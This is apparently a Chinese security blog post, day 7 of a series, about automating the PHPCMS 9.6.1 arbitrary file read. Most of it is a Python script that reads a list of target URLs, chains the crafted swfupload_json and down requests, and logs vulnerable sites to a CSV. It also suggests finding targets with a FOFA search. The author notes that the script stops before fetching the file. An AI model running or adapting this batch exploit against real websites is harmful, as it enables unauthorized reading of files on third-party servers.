ailx10说：这篇是我2024年8月写的。day7 接着做 PHPCMS 文件读取的自动化。我把前几次请求串起来，提 Cookie、提交参数、解析下载页面，看到 content 链接就先记录结果。写完再回头看，程序其实还没替我真正走到最后一步去拿内容，这和手工篇里看见文件是两个不同层次。我愿意把这个差别留在摘要里，因为它正好说明自动化容易省掉什么。请求链能接上已经是进展，下一步则是把最终验证和失败隔离补全，让输出不再只靠一个链接的外形猜测。

---

day7自动串联PHPCMS读取的前三阶段，Cookie提取后POST userid\_flash，下载页出现content链接就判成功，未实际请求第四步文件。

核查提示：siteid正则可能带分号，下载链接存在不证明内容已读取；未请求第四步且无异常隔离、超时，需与A0385真实内容证据区分。 原实验和代码未重新运行，图内细节有待核验。

本文分析 PHPCMS 文件读取链的前三阶段自动化。脚本出现下载链接并不意味着已经读取到文件内容。

- 找到对应的POC：[ailx10：PHPCMS 9.6.1 任意文件读取漏洞复现](/posts/a0385/)
- 找到对应的网站：FOFA搜索`body="PHPCMS"`

下面是原记录中的示例代码；其输入、异常处理和作用范围需要结合实验环境审查。

原脚本没有执行下载文件的第四步；需要访问并核对内容才能证明读取结果。

```
import re
import os
import csv
import requests
from datetime import datetime

class PHPCMS():
    def __init__(self):
        self.version = "-1"
        self.vuln_exist = "-1"
        self.vuln_success_url = "-1"
        self.vuln_success_result = "-1"

    def get_cms_version(self,url):
        version_url = "{}/index.php?m=member&c=index&a=register&siteid=1".format(url)
        if url.startswith("https://"):
            response = requests.get(version_url,verify=False)
        else:
            response = requests.get(version_url)
        version_pattern = r'Powered by.*?PHPCMS.*?(v\d+)'
        match = re.search(version_pattern, response.text)

        if match:
            self.version = match.group(1)
            print("PHPCms版本:{}".format(self.version))
        else:
            print("PHPCms版本:未知")

    def get_cms_siteid(self,url):
        headers = {
            "content-type": "application/x-www-form-urlencoded",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
        }
        siteid = ""
        vuln_url_1 = "{}/index.php?m=wap&c=index&a=init&siteid=1".format(url)
        if url.startswith("https://"):
            response = requests.get(vuln_url_1, headers=headers, verify=False)
        else:
            response = requests.get(vuln_url_1, headers=headers)
        if response.status_code == 200:
            if "Set-Cookie" in response.headers:
                set_cookie = response.headers["Set-Cookie"]
                pattern = r"siteid=(\S+)"
                match = re.search(pattern, set_cookie)
                if match:
                    siteid = match.group(1)
                    print("Site ID:", siteid)
                else:
                    print("No match found siteid.")

        return siteid

    def post_cms_userid_flash(self,url,siteid):
        headers = {
            "content-type": "application/x-www-form-urlencoded",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
        }
        att_json_content = ""
        vuln_url_2 = "{}/index.php?m=attachment&c=attachments&a=swfupload_json&aid=1&src=pad%3Dx%26i%3D1%26modelid%3D1%26catid%3D1%26d%3D1%26m%3D1%26s%3Dindex%26f%3D.p%25253chp".format(url)
        body = "userid_flash={}".format(siteid)
        if url.startswith("https://"):
            response = requests.post(vuln_url_2, headers=headers,data=body.encode('utf-8'),verify=False)
        else:
            response = requests.post(vuln_url_2,data=body.encode('utf-8'), headers=headers)
        if response.status_code == 200:
            if "Set-Cookie" in response.headers:
                pattern = r"att_json=(.*?)(;|$)"
                set_cookie = response.headers["Set-Cookie"]
                match = re.search(pattern, set_cookie)
                if match:
                    att_json_content = match.group(1)
                    print("att_json content:", att_json_content)
                else:
                    print("No match found att_json.")
        return att_json_content

    def get_download_url(self,url,att_json_content):
        headers = {
            "content-type": "application/x-www-form-urlencoded",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
        }

        vuln_url_3 = "{}/index.php?m=content&c=down&a=init&a_k={}".format(url,att_json_content)
        if url.startswith("https://"):
            response = requests.get(vuln_url_3, headers=headers, verify=False)
        else:
            response = requests.get(vuln_url_3, headers=headers)
        if response.status_code == 200:
            # print(response.text)
            pattern = r'<a href="(\?m=content[^"]*)"'
            match = re.search(pattern, response.text)
            if match:
                href_content = match.group(1)
                print("Href content:", href_content)
                print("vuln exist:{}".format(url))
                self.vuln_exist = 1
                self.vuln_success_result = 1
                self.vuln_success_url = vuln_url_3
                print("vuln_success_url:{}".format(vuln_url_3))
            else:
                print("No match found Href.")
                print("no vuln:{}".format(url))
                self.vuln_exist = 0
        else:
            print("response.status_code={}".format(response.status_code))




    def check_vulnerability(self,url):
        self.get_cms_version(url)
        siteid = self.get_cms_siteid(url)
        att_json_content = self.post_cms_userid_flash(url,siteid)
        self.get_download_url(url,att_json_content)



    def append_data_to_csv(self,file_name, data):
        file_path = os.path.join(os.getcwd(), file_name)
        file_exists = False
        if os.path.exists(file_path):
            file_exists = True
        with open(file_path, 'a+', newline='') as csvfile:
            writer = csv.writer(csvfile)
            if not file_exists:
                writer.writerow(data.keys())
            writer.writerow(data.values())




if __name__ == "__main__":
    test_url_list = []
    now = datetime.now()
    date_string = now.strftime("%Y-%m-%d")
    with open('url.txt', 'r', encoding='utf-8') as file:
        for line in file:
            test_url_list.append(line.strip())
    for url in test_url_list:
        cms = PHPCMS()
        url = url[:-1] if url.endswith("/") else url
        cms.check_vulnerability(url)

        url_vuln_info = {
                "url":url,
                "version":cms.version,
                "vuln_exist":cms.vuln_exist,
                "vuln_success_url":cms.vuln_success_url,
                "vuln_success_result":cms.vuln_success_result,
                "date_string":date_string
            }
        cms.append_data_to_csv("out.csv",url_vuln_info)
```
